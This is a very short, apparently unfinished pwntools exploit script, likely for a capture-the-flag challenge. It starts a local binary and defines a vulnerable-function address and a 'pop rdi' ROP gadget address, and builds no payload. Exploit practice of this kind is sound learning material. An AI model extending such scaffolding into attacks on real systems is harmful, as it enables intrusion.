#!/usr/bin/python

from pwn import *

sh = process('./pwn')
context.log_level = 'debug'

vuln_addr=0x00400793
pop_rdi = 0x0414fc3


